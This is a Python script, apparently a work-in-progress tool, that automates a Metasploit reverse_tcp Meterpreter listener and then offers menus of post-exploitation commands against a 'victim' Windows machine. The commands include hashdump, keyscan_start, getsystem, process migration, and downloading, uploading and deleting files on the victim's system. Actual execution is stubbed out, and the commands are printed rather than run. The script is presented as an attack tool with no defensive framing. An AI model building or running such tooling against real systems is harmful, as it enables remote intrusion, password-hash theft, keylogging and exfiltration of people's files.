import os
import time
from termcolor import colored

# Open all commands list and read into variable file
meterpreter_commands_advanced_file = open('../advanced_commands.txt', 'r')
file = meterpreter_commands_advanced_file.read()
# Use text file and split all lines into an array
# Array at position [0] is line 1 in .txt file
meterpreter_commands_advanced = file.splitlines()


print(colored('Before using this tool, make sure to take notice of the dependencies and the license.', 'green'))
print(colored('1. You must have Python 3.9 installed or above.', 'red'))
print(colored('2. You must be on the operating system Ubuntu Linux.', 'red'))
print(colored('3. To run either the basic commands, or the advanced commands, \n'
      '   there needs to be a working meterpreter session so please do not skip anything in this script,\n'
      '   just open up a new terminal tab.', 'red'))
print()
print(colored('License: GNU General Public License V3.0', 'blue'))
print('----------------------------------------------------------------------------------------------------')
print('Do you still want to continue? (yes/no)')
is_continue = input()
print('----------------------------------------------------------------------------------------------------')
if not is_continue == 'yes':
    print(colored('You have selected "no" as an answer. Program is exiting...', 'red'))
    time.sleep(2)
    print(colored('Bye Bye!', 'blue'))
    exit()


def ask_continue(command):
    print('Execute (e) or cancel (c) following Command:')
    print(colored(command, 'green'))
    choice = input()
    if choice == 'e':
        print('Running...')
        # os.system(command)
        print(command)
        print('Finished!')
    elif choice == 'c':
        print('You have chosen "c" for cancel. Program is exiting...')
        time.sleep(2)
        exit()
    else:
        print('Invalid choice. Program exiting...')
        time.sleep(2)
        exit()


def run_specified_command(command):
    if command not in meterpreter_commands_advanced:
        print('----------------------------------------------------------------------------------------------------')
        print(colored('Please choose a command from the list.', 'blue'))
        print('----------------------------------------------------------------------------------------------------')
    else:

        command_e = ''
        if command == 'bgkill':
            print('Which background script do you want to kill? (bglist to list all running background scripts)')
            script = input()
            command_e = 'bgkill' + script
            ask_continue(command_e)
        elif command == 'bglist':
            command_e = 'bglist'
            ask_continue(command_e)
        elif command == 'bgrun':
            print('Which background script do you want to run?')
            script = input()
            command_e = 'bgrun ' + script
            ask_continue(command_e)
        elif command == 'channel':
            command_e = 'channel'
            ask_continue(command_e)
        elif command == 'close':
            print('Which channel do you want to close?')
            channel = input()
            command_e = 'close ' + channel
            ask_continue(command_e)
        elif command == 'exit':
            command_e = 'exit'
            ask_continue(command_e)
        elif command == 'interact':
            print('With which channel do you want to interact?')
            channel = input()
            command_e = 'interact ' + channel
            ask_continue(command_e)
        elif command == 'irb':
            command_e = 'irb'
            ask_continue(command_e)
        elif command == 'migrate':
            print('To which process do you want to migrate? (Process_ID)')
            print(colored('Please be aware, this command *might* take some time', 'red'))
            process_id = input()
            command_e = 'migrate ' + process_id
            ask_continue(command_e)
            time.sleep(20)
        elif command == 'quit':
            command_e = 'quit'
            ask_continue(command_e)
        elif command == 'run':
            print('Which Meterpreter script do you want to run?')
            script = input()
            command_e = 'run ' + script
            ask_continue(command_e)
        elif command == 'use':
            print('Which Meterpreter extension do you want to load?')
            extension = input()
            command_e = 'use ' + extension
            ask_continue(command_e)
        elif command == 'write':
            print('To which channel would you like to write?')
            channel = input()
            print('What data would you like to write?')
            data = input()
            command_e = 'write ' + channel + '' + data
            ask_continue(command_e)
        elif command == 'cat':
            print("Which file's content would you like to display?")
            path_to_file = input()
            command_e = 'cat ' + path_to_file
            ask_continue(command_e)
        elif command == 'cd':
            print('To which directory do you want to go?')
            directory = input()
            command_e = 'cd ' + directory
            ask_continue(command_e)
        elif command == 'del':
            print('Which file do you want to delete?')
            path_to_file = input()
            command_e = 'del ' + path_to_file
            ask_continue(command_e)
        elif command == 'download':
            print("Which file from the Victim's Computer do you want to download?")
            path_to_file = input()
            command_e = 'download ' + path_to_file
            ask_continue(command_e)
        elif command == 'edit':
            print('Which file do you want to edit?')
            path_to_file = input()
            command_e = 'edit ' + path_to_file
            ask_continue(command_e)
        elif command == 'getlwd':
            command_e = 'getlwd'
            ask_continue(command_e)
        elif command == 'getwd':
            command_e = 'getwd'
            ask_continue(command_e)
        elif command == 'lcd':
            print('To which local directory do you want to go?')
            directory = input()
            command_e = 'lcd ' + directory
            ask_continue(command_e)
        elif command == 'lpwd':
            command_e = 'lpwd'
            ask_continue(command_e)
        elif command == 'ls':
            print('List directories and files of current (c) or specific (s)?')
            choice = input()
            if choice == 'c':
                command_e = 'ls'
                ask_continue(command_e)
            elif choice == 's':
                print('Which directory do you want to use "ls" on?')
                directory = input()
                command_e = 'ls ' + directory
                ask_continue(command_e)
        elif command == 'mkdir':
            print('Where is your new directory going to be?')
            directory = input()
            command_e = 'mkdir ' + directory
            ask_continue(command_e)
        elif command == 'rm':
            print('Which file do you want to remove?')
            path_to_file = input()
            command_e = 'rm ' + path_to_file
            ask_continue(command_e)
        elif command == 'rmdir':
            print('Which directory do you want to remove?')
            directory = input()
            command_e = 'rmdir ' + directory
            ask_continue(command_e)
        elif command == 'upload':
            print('Where is your file located on your System?')
            path_to_file = input()
            print('To which path do you want to upload the file on the Victims System?')
            path_to_file_victim = input()
            command_e = 'upload ' + path_to_file + ' ' + path_to_file_victim
            ask_continue(command_e)
        elif command == 'ipconfig':
            command_e = 'ipconfig'
            ask_continue(command_e)
        elif command == 'portfwd':
            print('All following commands are following...')


def exploit_commands_advanced():
    return meterpreter_commands_advanced


def exploit_commands_basic():
    meterpreter_commands_basic = ['getsystem',
                                  'sysinfo',
                                  'ps',
                                  'keyscan_start',
                                  'hashdump',
                                  'getprivs',
                                  'ipconfig']
    return meterpreter_commands_basic


def main():
    print("Enter listening Host:")
    lhost = input()
    print('----------------------------------------------------------------------------------------------------')
    print("Enter listening Port (Default '80'):")
    lport = input()
    print('----------------------------------------------------------------------------------------------------')
    print("Enter root Password:")
    root_password = input()
    print('----------------------------------------------------------------------------------------------------')
    if lport == '':
        lport = 80
    commands_setup = ['clear',
                      'sudo su -',
                      root_password,
                      'cd /home/metasploit-framework',
                      './msfconsole',
                      'use exploit/multi/handler',
                      'set PAYLOAD windows/meterpreter/reverse_tcp',
                      'set LHOST ' + lhost,
                      'set LPORT ' + str(lport),
                      'set ReverseListenerBindAddress localhost']
    print('Exploit? (yes/no)')
    is_exploit = input()
    print('----------------------------------------------------------------------------------------------------')
    if is_exploit == 'yes':
        # Run Setup Commands if user wants to exploit
        commands_setup.append('exploit')
        for command_setup in commands_setup:
            # later to be replaced with os.system
            print('Running Command: ' + command_setup)
            time.sleep(2)
            print('----------------------------------------------------------------------------------------------------')
        print('Was Meterpreter successful? (yes/no)')
        is_successful = input()
        if is_successful == 'yes':
            print('----------------------------------------------------------------------------------------------------')
            print('Choose one of the following Options:')
            print('Press "1" to run basic meterpreter commands (Show List: https://pastebin.com/DFR15KDb)')
            print('Press "2" to run custom/advanced Meterpreter Commands (Detailed List: https://pastebin.com/c5cRVYTv)')
            try:
                choice = int(input())
                if choice == 1:
                    commands = exploit_commands_basic()
                    for command in commands:
                        # later to be replaced with os.system
                        print('----------------------------------------------------------------------------------------------------')
                        print(command)
                        time.sleep(4)
                    print('Would you like to run advanced commands? (yes/no)')
                    choice = input()
                    if choice == 'yes':
                        advanced_commands = exploit_commands_advanced()
                        for advanced_command in advanced_commands:
                            # later to be replaced with os.system
                            print(advanced_command)
                        print('-------------------------------')
                        print('Which command you want to run?')
                        print('-------------------------------')
                        command_to_execute = input()
                        run_specified_command(command_to_execute)
                    else:
                        print('Okay, you chose not to see the advanced commands. Program is exiting...')
                        time.sleep(2)
                        exit()
                elif choice == 2:
                    advanced_commands = exploit_commands_advanced()
                    for advanced_command in advanced_commands:
                        # later to be replaced with os.system
                        print(advanced_command)
                    print('-------------------------------')
                    print('Which command you want to run?')
                    command_to_execute = input()
                    run_specified_command(command_to_execute)
                else:
                    print('Please only choose between 1 and 2.')
            except ValueError:
                print('Pleas enter a Number, not a String.')
    else:
        print('Listener was not created. Program exiting...')
        time.sleep(2)
        exit()


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print('Program was stopped manually')
